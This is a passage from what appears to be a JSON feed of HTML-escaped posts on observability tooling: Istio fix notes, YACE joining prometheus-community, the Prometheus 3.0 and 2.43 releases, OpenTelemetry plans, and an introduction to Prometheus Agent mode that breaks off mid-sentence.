#56477</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the <code>topology.istio.io/network</code> label was not properly skipped on the system namespace when <code>discoverySelectors</code> were in use.\n(<a href=\"https://github.com/istio/istio/issues/56687\">Issue #56687</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the CNI plugin incorrectly handled pod deletion when the pod was not yet marked as enrolled in the mesh. In some cases, this could cause a pod, which had been deleted, to be included in the ZDS snapshot and never cleaned up. If this occurred, ztunnel would not be able to become ready.  (<a href=\"https://github.com/istio/istio/issues/56738\">Issue #56738</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where access logs were not updated when the referenced service was created later than the Telemetry resource.  (<a href=\"https://github.com/istio/istio/issues/56825\">Issue #56825</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>ClusterTrustBundle</code> was not configured properly when <code>ENABLE_CLUSTER_TRUST_BUNDLE_API</code> was enabled.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where Istio access logs were never sent to the OTLP endpoint.  (<a href=\"https://github.com/istio/istio/issues/56825\">Issue 56825</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where high CPU usage could occur if an item was actively being worked on by a different worker until that worker was done with that item.</p>\n</li>\n</ul>",

This move will make it more accessible to users and open new opportunities for contributors to enhance and maintain the project. There's also a blog post from <a href=\"https://grafana.com/blog/2024/11/19/yace-moves-to-prometheus-community/\">Cristian Greco's point of view</a>.</p>\n<h2>The early days</h2>\n<p>When I first started YACE, I had no idea it would grow to this scale. At the time, I was working with <a href=\"https://www.ivx.com\">Invision AG</a> (not to be confused with the design app), a company focused on workforce management software. They fully supported me in open-sourcing the tool, and with the help of my teammate <a href=\"https://github.com/kforsthoevel\">Kai Forsthövel</a>, YACE was brought to life.</p>\n<p>Our first commit was back in 2018, with one of our primary goals being to make CloudWatch metrics easy to scale and automatically detect what to measure, all while keeping the user experience simple and intuitive. InVision AG was scaling their infrastructure up and down due to machine learning workloads and we needed something that detects new infrastructure easily. This focus on simplicity has remained a core priority. From that point on, YACE began to find its audience.</p>\n<h2>Yace Gains Momentum</h2>\n<p>As YACE expanded, so did the support around it. One pivotal moment was when <a href=\"https://github.com/cristiangreco\">Cristian Greco</a> from Grafana Labs reached out. I was feeling overwhelmed and hardly keeping up when Cristian stepped in, simply asking where he could help. He quickly became the main releaser and led Grafana Labs' contributions to YACE, a turning point that made a huge impact on the project. Along with an incredible community of contributors from all over the world, they elevated YACE beyond what I could have achieved alone, shaping it into a truly global tool. YACE is no longer just my project or Invision's—it belongs to the community.</p>\n<h2>Gratitude and Future Vision</h2>\n<p>I am immensely grateful to every developer, tester, and user who has contributed to YACE's success. This journey has shown me the power of community and open source collaboration. But we're not done yet.</p>\n<p>It's time to take Yace even further—into the heart of the Prometheus ecosystem. Making Yace as the official Amazon CloudWatch exporter for Prometheus will make it easier and more accessible for everyone. With ongoing support from Grafana Labs and my commitment to refining the user experience, we'll ensure YACE becomes an intuitive tool that anyone can use effortlessly.</p>\n<h2>Try out YACE on your own</h2>\n<p>Try out <strong><a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter\">YACE (Yet Another CloudWatch Exporter)</a></strong> by following our step-by-step <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/blob/master/docs/installation.md\">Installation Guide</a>.</p>\n<p>You can explore various configuration examples <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/tree/master/examples\">here</a> to get started with monitoring specific AWS services.</p>\n<p>Our goal is to enable easy auto-discovery across all AWS services, making it simple to monitor any dynamic infrastructure.</p>",

      "summary": "<p>Following the recent release of <a href=\"https://prometheus.io/blog/2024/09/11/prometheus-3-beta/\">Prometheus 3.0 beta</a> at PromCon in Berlin, the Prometheus Team\nis excited to announce the immediate availability of Prometheus Version 3.0!</p>\n<p>This latest version marks a significant milestone as it is the first major release in 7 years. Prometheus has come a long way in that time,\nevolving from a project for early adopters to becoming a standard part of the cloud native monitoring stack. Prometheus 3.0 aims to\ncontinue that journey by adding some exciting new features while largely maintaining stability and compatibility with previous versions.</p>\n<p>The full 3.0 release adds some new features on top of the beta and also introduces a few additional breaking changes that we will describe in this article.</p>\n<h2>What's New</h2>\n<p>Here is a summary of the exciting changes that have been released as part of the beta version, as well as what has been added since:</p>\n<h3>New UI</h3>\n<p>One of the highlights in Prometheus 3.0 is its brand-new UI that is enabled by default:</p>\n<p><img alt=\"New UI query page\" src=\"https://prometheus.io/assets/blog/2024-11-14/blog_post_screenshot_tree_view-s.png\" /></p>\n<p>The UI has been completely rewritten with less clutter, a more modern look and feel, new features like a <a href=\"https://promlens.com/\"><strong>PromLens</strong></a>-style tree view,\nand will make future maintenance easier by using a more modern technical stack.</p>\n<p>Learn more about the new UI in general in <a href=\"https://promlabs.com/blog/2024/09/11/a-look-at-the-new-prometheus-3-0-ui/\">Julius' detailed article on the PromLabs blog</a>.\nUsers can temporarily enable the old UI by using the <code>old-ui</code> feature flag.</p>\n<p>Since the new UI is not battle-tested yet, it is also very possible that there are still bugs. If you find any, please\n<a href=\"https://github.com/prometheus/prometheus/issues/new?assignees=&#x26;labels=&#x26;projects=&#x26;template=bug_report.yml\">report them on GitHub</a>.</p>\n<p>Since the beta, the user interface has been updated to support UTF-8 metric and label names.</p>\n<p><img alt=\"New UTF-8 UI\" src=\"https://prometheus.io/assets/blog/2024-11-14/utf8_ui.png\" /></p>\n<h3>Remote Write 2.0</h3>\n<p>Remote-Write 2.0 iterates on the previous protocol version by adding native support for a host of new elements including metadata, exemplars,\ncreated timestamp and native histograms. It also uses string interning to reduce payload size and CPU usage when compressing and decompressing.\nThere is better handling for partial writes to provide more details to clients when this occurs. More details can be found\n<a href=\"https://prometheus.io/docs/specs/remote_write_spec_2_0/\">here</a>.</p>\n<h3>UTF-8 Support</h3>\n<p>Prometheus now allows all valid UTF-8 characters to be used in metric and label names by default, as well as label values,\nas has been true in version 2.x.</p>\n<p>Users will need to make sure their metrics producers are configured to pass UTF-8 names, and if either side does not support UTF-8,\nmetric names will be escaped using the traditional underscore-replacement method. PromQL queries can be written with the new quoting syntax\nin order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Currently only the Go client library has been updated to support UTF-8, but support for other languages will be added soon.</p>\n<h3>OTLP Support</h3>\n<p>In alignment with <a href=\"https://prometheus.io/blog/2024/03/14/commitment-to-opentelemetry/\">our commitment to OpenTelemetry</a>, Prometheus 3.0 features\nseveral new features to improve interoperability with OpenTelemetry.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the <code>/api/v1/otlp/v1/metrics</code> endpoint.</p>\n<p>See our <a href=\"https://prometheus.io/docs/guides/opentelemetry\">guide</a> on best practices for consuming OTLP metric traffic into Prometheus.</p>\n<h4>UTF-8 Normalization</h4>\n<p>With Prometheus 3.0, thanks to <a href=\"https://prometheus.io/blog/feed.xml#utf-8-support\">UTF-8 support</a>, users can store and query OpenTelemetry metrics without annoying changes to metric and label names like <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/pkg/translator/prometheus\">changing dots to underscores</a>.</p>\n<p>Notably this allows <strong>less confusion</strong> for users and tooling in terms of the discrepancy between what’s defined in OpenTelemetry semantic convention or SDK and what’s actually queryable.</p>\n<p>To achieve this for OTLP ingestion, Prometheus 3.0 has experimental support for different translation strategies. See <a href=\"https://prometheus.io/docs/prometheus/latest/configuration/configuration/#:~:text=Settings%20related%20to%20the%20OTLP%20receiver%20feature\">otlp section in the Prometheus configuration</a> for details.</p>\n<blockquote>\n<p>NOTE: While “NoUTF8EscapingWithSuffixes” strategy allows special characters, it still adds required suffixes for the best experience. See <a href=\"https://github.com/prometheus/proposals/pull/39\">the proposal on the future work to enable no suffixes</a> in Prometheus.</p>\n</blockquote>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>. Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Breaking Changes</h3>\n<p>The Prometheus community strives to <a href=\"https://prometheus.io/docs/prometheus/latest/stability/\">not break existing features within a major release</a>. With a new major release we took the opportunity to clean up a few, but small, long-standing issues. In other words, Prometheus 3.0 contains a few breaking changes. This includes changes to feature flags, configuration files, PromQL, and scrape protocols.</p>\n<p>Please read the <a href=\"https://prometheus.io/docs/prometheus/3.0/migration/\">migration guide</a> to find out if your setup is affected and what actions to take.</p>\n<h2>Performance</h2>\n<p>It’s impressive to see what we have accomplished in the community since Prometheus 2.0. We all love numbers, so let’s celebrate the efficiency improvements we made for both CPU and memory use for the TSDB mode. Below you can see performance numbers between 3 Prometheus versions on the node with 8 CPU and 49 GB allocatable memory.</p>\n<ul>\n<li>2.0.0 (7 years ago)</li>\n<li>2.18.0 (4 years ago)</li>\n<li>3.0.0 (now)</li>\n</ul>\n<p><img alt=\"Memory bytes\" src=\"https://prometheus.io/assets/blog/2024-11-14/memory_bytes_ui.png\" /></p>\n<p><img alt=\"CPU seconds\" src=\"https://prometheus.io/assets/blog/2024-11-14/cpu_seconds_ui.png\" /></p>\n<p>It’s furthermore impressive that those numbers were taken using our <a href=\"https://github.com/prometheus/prometheus/pull/15366\">prombench macrobenchmark</a>\nthat uses the same PromQL queries, configuration and environment–highlighting backward compatibility and stability for the core features, even with 3.0.</p>\n<h2>What's Next</h2>\n<p>There are still tons of exciting features and improvements we can make in Prometheus and the ecosystem. Here is a non-exhaustive list to get you excited and…\nhopefully motivate you to contribute and join us!</p>\n<ul>\n<li>New, more inclusive <strong>governance</strong></li>\n<li>More <strong>OpenTelemetry</strong> compatibility and features</li>\n<li>OpenMetrics 2.0, now under Prometheus governance!</li>\n<li>Native Histograms stability (and with custom buckets!)</li>\n<li>More optimizations!</li>\n<li>UTF-8 support coverage in more SDKs and tools</li>\n</ul>\n<h2>Try It Out!</h2>\n<p>You can try out Prometheus 3.0 by downloading it from our <a href=\"https://prometheus.io/download/#prometheus\">official binaries</a> and <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">container images</a>.</p>\n<p>If you are upgrading from Prometheus 2.x, check out the migration guide for more information on any adjustments you will have to make.\nPlease note that we strongly recommend upgrading to v2.55 before upgrading to v3.0. Rollback is possible from v3.0 to v2.55, but not to earlier versions.</p>\n<p>As always, we welcome feedback and contributions from the community!</p>",

This involves also GA-ing our support for native / exponential histograms.</p>\n<h3>Support UTF-8 metric and label names</h3>\n<p><a href=\"https://github.com/open-telemetry/semantic-conventions/blob/main/docs/http/http-metrics.md\">OpenTelemetry semantic conventions</a> push for <code>“.”</code> to be the namespacing character. For example, <code>http.server.request.duration</code>. However, Prometheus currently requires a <a href=\"https://prometheus.io/docs/instrumenting/writing_exporters/#naming\">more limited character set</a>, which means we convert the metric to <code>http_server_request_duration</code> when ingesting it into Prometheus.</p>\n<p>This causes unnecessary dissonance and we’re working on removing this limitation by adding UTF-8 support for all labels and metric names. The progress is tracked <a href=\"https://github.com/prometheus/prometheus/issues/13095\">here</a>.</p>\n<h3>Native support for resource attributes</h3>\n<p>OpenTelemetry differentiates between metric attributes (labels to identify the metric itself, like <code>http.status_code</code>) and resource attributes (labels to identify the source of the metrics, like <code>k8s.pod.name</code>), while Prometheus has a more flat label schema. This leads to many usability issues that are detailed <a href=\"https://docs.google.com/document/d/1gG-eTQ4SxmfbGwkrblnUk97fWQA93umvXHEzQn2Nv7E/edit?usp=sharing\">here</a>.</p>\n<p>We’re <a href=\"https://docs.google.com/document/d/1FgHxOzCQ1Rom-PjHXsgujK8x5Xx3GTiwyG__U3Gd9Tw/edit\">exploring several solutions</a> to this problem from many fronts (Query, UX, storage, etc.), but our goal is to make it quite easy to filter and group on resource attributes. This is a work in progress, and feedback and help are wanted!</p>\n<h3>OTLP export in the ecosystem</h3>\n<p>Prometheus remote write is supported by <a href=\"https://prometheus.io/docs/operating/integrations/#remote-endpoints-and-storage\">most of the leading Observability projects and vendors</a> already. However, OpenTelemetry Protocol (OTLP) is gaining prominence and we would like to support it across the Prometheus ecosystem.</p>\n<p>We would like to add support for it to the Prometheus server, SDKs and the exporters. This would mean that any service instrumented with the Prometheus SDKs will also be able to <em>push</em> OTLP and it will unlock the rich Prometheus exporter ecosystem for OpenTelemetry users.</p>\n<p>However, we intend to keep and develop the OpenMetrics exposition format as an optimized / simplified format for Prometheus and pull-based use-cases.</p>\n<h3>Delta temporality</h3>\n<p>The OpenTelemetry project also supports <a href=\"https://grafana.com/blog/2023/09/26/opentelemetry-metrics-a-guide-to-delta-vs.-cumulative-temporality-trade-offs/\">Delta temporality</a> which has some use-cases for the Observability ecosystem. We have a lot of Prometheus users still running statsd and using the statsd_exporter for various reasons.</p>\n<p>We would like to support the Delta temporality of OpenTelemetry in the Prometheus server and are <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/issues/30479\">working towards it</a>.</p>\n<h2>Call for contributions!</h2>\n<p>As you can see, a lot of new and exciting things are coming to Prometheus! If working in the intersection between two of the most relevant open-source projects around observability sounds challenging and interesting to you, we'd like to have you on board!</p>\n<p>This year there is also a change of governance in the works that will make the process of becoming a maintainer easier than ever! If you ever wanted to have an impact on Prometheus, now is a great time to get started.</p>\n<p>Our first focus has always been to be as open and transparent as possible on how we are organizing all the work above so that you can also contribute. We are looking for contributors to support this initiative and help implement these features. Check out the <a href=\"https://github.com/orgs/prometheus/projects/9\">Prometheus 3.0 public board</a> and <a href=\"https://github.com/prometheus/prometheus/issues?q=is%3Aopen+is%3Aissue+milestone%3A%22OTEL+Support%22\">Prometheus OTel support milestone</a> to track the progress of the feature development and see ways that you can <a href=\"https://github.com/prometheus/prometheus/blob/main/CONTRIBUTING.md\">contribute</a>.</p>\n<h2>Conclusion</h2>\n<p>Some of the changes proposed are large and invasive or involve a fundamental departure from the original data model of Prometheus. However, we plan to introduce these gracefully so that Prometheus 3.0 will have no major breaking changes and most of the users can upgrade without impact.</p>\n<p>We are excited to embark on this new chapter for Prometheus and would love your feedback on the changes suggested.</p>",

      "summary": "<p>Prometheus 2.43 has just been released, and it brings some exciting features and\nenhancements. One of the significant improvements is the <code>stringlabels</code> release,\nwhich uses a new data structure for labels. This blog post will answer some\nfrequently asked questions about the 2.43 release and the <code>stringlabels</code>\noptimizations.</p>\n<h2>What is the <code>stringlabels</code> release?</h2>\n<p>The <code>stringlabels</code> release is a Prometheus 2.43 version that uses a new data\nstructure for labels. It stores all the label/values in a single string,\nresulting in a smaller heap size and some speedups in most cases. These\noptimizations are not shipped in the default binaries and require compiling\nPrometheus using the Go tag <code>stringlabels</code>.</p>\n<h2>Why didn't you go for a feature flag that we can toggle?</h2>\n<p>We considered using a feature flag but it would have a memory overhead that was\nnot worth it. Therefore, we decided to provide a separate release with these\noptimizations for those who are interested in testing and measuring the gains on\ntheir production environment.</p>\n<h2>When will these optimizations be generally available?</h2>\n<p>These optimizations will be available in the upcoming Prometheus 2.44 release\nby default.</p>\n<h2>How do I get the 2.43 release?</h2>\n<p>The <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0\">Prometheus 2.43 release</a> is available on the official Prometheus GitHub\nreleases page, and users can download the binary files directly from there.\nAdditionally, Docker images are also available for those who prefer to use\ncontainers.</p>\n<p>The stringlabels optimization is not included in these default binaries. To use\nthis optimization, users will need to download the <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0%2Bstringlabels\">2.43.0+stringlabels\nrelease</a>\nbinary or the <a href=\"https://quay.io/repository/prometheus/prometheus?tab=tags\">Docker images tagged\nv2.43.0-stringlabels</a> specifically.</p>\n<h2>Why is the release <code>v2.43.0+stringlabels</code> and the Docker tag <code>v2.43.0-stringlabels</code>?</h2>\n<p>In semantic versioning, the plus sign (+) is used to denote build\nmetadata. Therefore, the Prometheus 2.43 release with the <code>stringlabels</code>\noptimization is named <code>2.43.0+stringlabels</code> to signify that it includes the\nexperimental <code>stringlabels</code> feature. However, Docker tags do not allow the use of\nthe plus sign in their names. Hence, the plus sign has been replaced with a dash\n(-) to make the Docker tag <code>v2.43.0-stringlabels</code>. This allows the Docker tag to\npass the semantic versioning checks of downstream projects such as the\nPrometheus Operator.</p>\n<h2>What are the other noticeable features in the Prometheus 2.43 release?</h2>\n<p>Apart from the <code>stringlabels</code> optimizations, the Prometheus 2.43 release\nbrings several new features and enhancements. Some of the significant additions\ninclude:</p>\n<ul>\n<li>We added support for <code>scrape_config_files</code> to include scrape configs from\ndifferent files. This makes it easier to manage and organize the configuration.</li>\n<li>The HTTP clients now includes two new config options: <code>no_proxy</code> to exclude\nURLs from proxied requests and <code>proxy_from_environment</code> to read proxies from\nenv variables. These features make it easier to manage the HTTP client's\nbehavior in different environments.</li>\n</ul>\n<p>You can learn more about features and bugfixes in the\n<a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.43.0\">full changelog</a>.</p>",

      "summary": "<blockquote>\n<p>Bartek Płotka has been a Prometheus Maintainer since 2019 and Principal Software Engineer at Red Hat. Co-author of the CNCF Thanos project. CNCF Ambassador and tech lead for the CNCF TAG Observability. In his free time, he writes a book titled \"Efficient Go\" with O'Reilly. Opinions are my own!</p>\n</blockquote>\n<p>What I personally love in the Prometheus project, and one of the many reasons why I joined the team, was the laser focus on the project's goals. Prometheus was always about pushing boundaries when it comes to providing pragmatic, reliable, cheap, yet invaluable metric-based monitoring. Prometheus' ultra-stable and robust APIs, query language, and integration protocols (e.g. Remote Write and <a href=\"https://openmetrics.io/\">OpenMetrics</a>) allowed the Cloud Native Computing Foundation (CNCF) metrics ecosystem to grow on those strong foundations. Amazing things happened as a result:</p>\n<ul>\n<li>We can see community exporters for getting metrics about virtually everything e.g. <a href=\"https://github.com/google/cadvisor\">containers</a>, <a href=\"https://github.com/cloudflare/ebpf_exporter\">eBPF</a>, <a href=\"https://github.com/sladkoff/minecraft-prometheus-exporter\">Minecraft server statistics</a> and even <a href=\"https://megamorf.gitlab.io/2019/07/14/monitoring-plant-health-with-prometheus/\">plants' health when gardening</a>.</li>\n<li>Most people nowadays expect cloud-native software to have an HTTP/HTTPS <code>/metrics</code> endpoint that Prometheus can scrape. A concept developed in secret within Google and pioneered globally by the Prometheus project.</li>\n<li>The observability paradigm shifted. We see SREs and developers rely heavily on metrics from day one, which improves software resiliency, debuggability, and data-driven decisions!</li>\n</ul>\n<p>In the end, we hardly see Kubernetes clusters without Prometheus running there.</p>\n<p>The strong focus of the Prometheus community allowed other open-source projects to grow too to extend the Prometheus deployment model beyond single nodes (e.g. <a href=\"https://cortexmetrics.io/\">Cortex</a>, <a href=\"https://thanos.io/\">Thanos</a> and more). Not mentioning cloud vendors adopting Prometheus' API and data model (e.g. <a href=\"https://aws.amazon.com/prometheus/\">Amazon Managed Prometheus</a>, <a href=\"https://cloud.google.com/stackdriver/docs/managed-prometheus\">Google Cloud Managed Prometheus</a>, <a href=\"https://grafana.com/products/cloud/\">Grafana Cloud</a> and more). If you are looking for a single reason why the Prometheus project is so successful, it is this: <strong>Focusing the monitoring community on what matters</strong>.</p>\n<p>In this (lengthy) blog post, I would love to introduce a new operational mode of running Prometheus called \"Agent\". It is built directly into the Prometheus binary. The agent mode disables some of Prometheus' usual features and optimizes the binary for scraping and remote writing to remote locations. Introducing a mode that reduces the number of features enables new usage patters. In this blog post I will explain why it is a game-changer for certain deployments in the CNCF ecosystem. I am super excited about this!</p>\n<h2>History of the Forwarding Use Case</h2>\n<p>The core design of Prometheus has been unchanged for the project's entire lifetime. Inspired by <a href=\"https://sre.google/sre-book/practical-alerting/#the-rise-of-borgmon\">Google's Borgmon monitoring system</a>, you can deploy a Prometheus server alongside the applications you want to monitor, tell Prometheus how to reach them, and allow to scrape the current values of their metrics at regular intervals. Such a collection method, which is often referred to as the \"pull model\", is the core principle that <a href=\"https://prometheus.io/blog/2016/07/23/pull-does-not-scale-or-does-it/\">allows Prometheus to be lightweight and reliable</a>. Furthermore, it enables application instrumentation and exporters to be dead simple, as they only need to provide a simple human-readable HTTP endpoint with the current value of all tracked metrics (in OpenMetrics format). All without complex push infrastructure and non-trivial client libraries. Overall, a simplified typical Prometheus monitoring deployment looks as below:</p>\n<p><img alt=\"Prometheus high-level view\" src=\"https://prometheus.io/assets/blog/2021-11-16/prom.png\" /></p>\n<p>This works great, and we have seen millions of successful deployments like this over the years that process dozens of millions of active series. Some of them for longer time retention, like two years or so. All allow to query, alert, and record metrics useful for both cluster admins and developers.</p>\n<p>However, the cloud-native world is constantly growing and evolving. With the growth of managed Kubernetes solutions and clusters created on-demand within seconds, we are now finally able to treat clusters as \"cattle\", not as \"pets\" (in other words, we care less about individual instances of those). In some cases, solutions do not even have the cluster notion anymore, e.g. <a href=\"https://github.com/kcp-dev/kcp\">kcp</a>, <a href=\"https://aws.amazon.com/fargate/\">Fargate</a> and other platforms.</p>\n<p><img alt=\"Yoda\" src=\"https://prometheus.io/assets/blog/2021-11-16/yoda.gif\" /></p>\n<p>The other interesting use case that emerges is the notion of <strong>Edge</strong> clusters or networks. With industries like telecommunication, automotive and IoT devices adopting cloud-native technologies, we see more and more much smaller clusters with a restricted amount of resources. This is forcing all data (including observability) to be transferred to remote, bigger counterparts as almost nothing can be stored on those remote nodes.</p>\n<p>What does that mean? That means monitoring data has to be somehow aggregated, presented to users and sometimes even stored on the <em>global</em> level. This is often called a <strong>Global-View</strong> feature.</p>\n<p>Naively, we could think about implementing this by either putting Prometheus on that global level and scraping metrics across remote networks or pushing metrics directly from the application to the central location for monitoring purposes. Let me explain why both are generally <em>very</em> bad ideas:</p>\n<p>🔥 Scraping across network boundaries can be a challenge if it adds new unknowns in a monitoring pipeline. The local pull model allows Prometheus to know why exactly the metric target has problems and when. Maybe it's down, misconfigured, restarted, too slow to give us metrics (e.g. CPU saturated), not discoverable by service discovery, we don't have credentials to access or just DNS, network, or the whole cluster is down. By putting our scraper outside of the network, we risk losing some of this information by introducing unreliability into scrapes that is unrelated to an individual target. On top of that, we risk losing important visibility completely if the network is temporarily down. Please don't do it. It's not worth it. (:</p>\n<p>🔥 Pushing metrics directly from the application to some central location is equally bad. Especially when you monitor a larger fleet, you know literally nothing when you don't see metrics from remote applications. Is the application down? Is my receiver pipeline down? Maybe the application failed to authorize? Maybe it failed to get the IP address of my remote cluster? Maybe it's too slow? Maybe the network is down? Worse, you may not even know that the data from some application targets is missing. And you don't even gain a lot as you need to track the state and status of everything that should be sending data. Such a design needs careful analysis as it can be a recipe for a failure too easily.</p>\n<blockquote>\n<p>NOTE: Serverless functions and short-living containers are often cases where we think about push from application as the rescue. At this point however we talk about events or pieces of metrics we might want to aggregate to longer living time series. This topic is discussed <a href=\"https://groups.google.com/g/prometheus-developers/c/FPe0LsTfo2E/m/yS7up2YzAwAJ\">here</a>, feel free to contribute and help us support those cases better!</p>\n</blockquote>\n<p>Prometheus introduced three ways to support the global view case, each with its own pros and cons. Let's briefly go through those. They are shown in orange color in the diagram below:</p>\n<p><img alt=\"Prometheus global view\" src=\"https://prometheus.io/assets/blog/2021-11-16/prom-remote.png\" /></p>\n<ul>\n<li><strong>Federation</strong> was introduced as the first feature for aggregation purposes. It allows a global-level Prometheus server to scrape a subset of metrics from a leaf Prometheus. Such a \"federation\" scrape reduces some unknowns across networks because metrics exposed by federation endpoints include the original samples' timestamps. Yet, it usually suffers from the inability to federate all metrics and not lose data during longer network partitions (minutes).</li>\n<li><strong>Prometheus Remote Read</strong> allows selecting raw metrics from a remote Prometheus server's database without a direct PromQL query. You can deploy Prometheus or other solutions (e.g. Thanos) on the global level to perform PromQL queries on this data while fetching the required metrics from multiple remote locations. This is really powerful as it allows you to store data \"locally\" and access it only when needed. Unfortunately, there are cons too. Without features like <a href=\"https://github.com/thanos-io/thanos/issues/305\">Query Pushdown</a> we are in extreme cases pulling GBs of compressed metric data to answer a single query. Also, if we have a network partition, we are temporarily blind. Last but not least, certain security guidelines are not allowing ingress traffic, only egress one.</li>\n<li>Finally, we have <strong>Prometheus Remote Write</strong>, which seems to be the most popular choice nowadays. Since the agent mode focuses on remote write use cases, let's explain it in more detail.</li>\n</ul>\n<h3>Remote Write</h3>\n<p>The Prometheus Remote Write protocol allows us to forward (stream) all or a subset of metrics collected by Prometheus to the remote location. You can configure Prometheus to forward some metrics (if you want, with all metadata and exemplars!) to one or more locations that support the Remote Write API. In fact, Prometheus supports both ingesting and sending Remote Write, so you can deploy Prometheus on a global level to receive that stream and aggregate data cross-cluster.</p>\n<p>While the official <a href=\"https://docs.google.com/document/d/1LPhVRSFkGNSuU1fBd81ulhsCPR4hkSZyyBj1SZ8fWOM/edit\">Prometheus Remote Write API specification is in review stage</a>, the ecosystem adopted the Remote Write protocol as the default metrics export protocol. For example, Cortex, Thanos, OpenTelemetry, and cloud services like Amazon, Google, Grafana, Logz.io, etc., all support ingesting data via Remote Write.</p>\n<p>The Prometheus project also offers the official compliance tests for its APIs, e.g. <a href=\"https://github.com/prometheus/compliance/tree/main/remote_write_sender\">remote-write sender compliance</a> for solutions that offer Remote Write client capabilities. It's an amazing way to quickly tell if you are correctly implementing this protocol.</p>\n<p>Streaming data from such a scraper enables Global View use cases by allowing you to store metrics data in a centralized location. This also enables separation of concerns, which is useful when applications are managed by different teams than the observability or monitoring pipelines. Furthermore, it is also why Remote Write is chosen by vendors who want to offload as much work from their customers as possible.</p>\n<blockquote>\n<p>Wait for a second, Bartek. You just mentioned before that pushing metrics directly from the application is not the best idea!</p>\n</blockquote>\n<p>Sure, but the amazing part is that, even with Remote Write, Prometheus still uses a pull model to gather metrics from applications, which gives us an understanding of those different failure modes. After that, we batch samples and series and export, replicate (push) data to the Remote Write endpoints, limiting the number of monitoring unknowns that the central point has!</p>\n<p>It's important to note that a reliable and efficient remote-writing implementation is a non-trivial problem to solve. The Prometheus community spent around three years to come up with a stable and scalable implementation. We reimplemented the WAL (write-ahead-log) a few times, added internal queuing, sharding, smart back-offs and more. All of this is hidden from the user, who can enjoy well-performing streaming or large amounts of metrics stored in a centralized location.</p>\n<h3>Hands-on Remote Write Example: Katacoda Tutorial</h3>\n<p>All of this is not new in Prometheus. Many of us already use Prometheus to scrape all required metrics and remote-write all or some of them to remote locations.</p>\n<p>Suppose you would like to try the hands-on experience of remote writing capabilities. In that case, we recommend the <a href=\"https://katacoda.com/thanos/courses/thanos/3-receiver\">Thanos Katacoda tutorial of remote writing metrics from Prometheus</a>, which explains all steps required for Prometheus to forward all metrics to the remote location. It's <strong>free</strong>, just sign up for an account and enjoy the tutorial! 🤗</p>\n<p>Note that this example uses Thanos in receive mode as the remote storage. Nowadays, you can use plenty of other projects that are compatible with the remote write API.</p>\n<p>So if remote writing works fine, why did we add a special Agent mode to Prometheus?</p>\n<h2>Prometheus Agent Mode</h2>\n<p>From Prometheus <code>v2.32.0</code> (next release), everyone will be able to run the Prometheus binary with an experimental <code>--enable-feature=agent</code> flag. If you want to try it before the release, feel free to use <a href=\"https://github.com/prometheus/prometheus/releases/tag/v2.32.0-beta.0\">Prometheus v2.32.0-beta.0</a> or use our <code>quay.io/prometheus/prometheus:v2.32.0-beta.0</code> image.</p>\n<p>The Agent mode optimizes Prometheus for the remote write use case. It disables querying, alerting, and local storage, and replaces it with a customized TSDB WAL. Everything else stays the same: scraping logic, service discovery and related configuration. It can be used as a drop-in replacement for Prometheus if you want to just forward your data to a remote Prometheus server or any other Remote-Write-compliant project. In essence it looks like this:</p>\n<p><img alt=\"Prometheus agent\" src=\"https://prometheus.io/assets/blog/2021-11-16/agent.png\" /></p>\n<p>The best part about Prometheus Agent is that it's built into Prometheus. Same scraping APIs, same semantics, same configuration and discovery mechanism.</p>\n<p>What are the benefits of using the Agent mode if you plan not to query or alert on data locally and stream metrics outside? There are a few:</p>\n<p>First of all, efficiency. Our customized Agent TSDB WAL removes the data immediately after successful writes. If it cannot reach the remote endpoint, it persists the data temporarily on the disk until the remote endpoint is back online. This is currently limited to a two-hour buffer only, similar to non-agent Prometheus, <a href=\"https://github.com/prometheus/prometheus/issues/9607\">hopefully unblocked soon</a>. This means that we don't need to build chunks of data in memory. We don't need to maintain a full index for querying purposes. Essentially the Agent mode uses a fraction of the resources that a normal Prometheus server would use in a similar situation.</p>\n<p>Does this efficiency matter? Yes! As we mentioned, every GB of memory and every CPU core used on edge clusters matters for some deployments. On the other hand, the paradigm of performing monitoring using metrics is quite mature these days. This means that the more relevant metrics with more cardinality you can ship for the same cost - the better.</p>\n<blockquote>\n<p>NOTE: With the introduction of the Agent mode, the original Prometheus server mode still stays as the recommended, stable and maintained mode. Agent mode with remote storage brings additional complexity. Use with care.</p>\n</blockquote>\n<p>Secondly, the benefit of the new Agent mode is that it enables easier horizontal scalability for ingestion. This is something I am excited about the most. Let me explain why.</p>\n<h3>The Dream: Auto-Scalable Metric Ingestion</h3>\n<p>A true auto-scalable solution for scraping would need to be based on the amount of metric targets and the number of metrics they expose. The more data we have to scrape, the more instances of Prometheus we deploy automatically. If the number of targets or their number of metrics goes down, we could scale down and remove a couple of instances. This would remove the manual burden of adjusting the sizing of Prometheus and stop the need for over-allocating Prometheus for situations where the cluster is temporarily small.</p>\n<p>With just Prometheus in server mode, this was hard to achieve. This is because Prometheus in server mode is stateful. Whatever is collected stays as-is in a single place. This means that the scale-down procedure would need to back up the collected data to existing instances before termination. Then we would have the problem of overlapping scrapes, misleading staleness markers etc.</p>\n<p>On top of that, we would need some global view query that is able to aggregate all samples across all instances (e.g. Thanos Query or Promxy). Last but not least, the resource 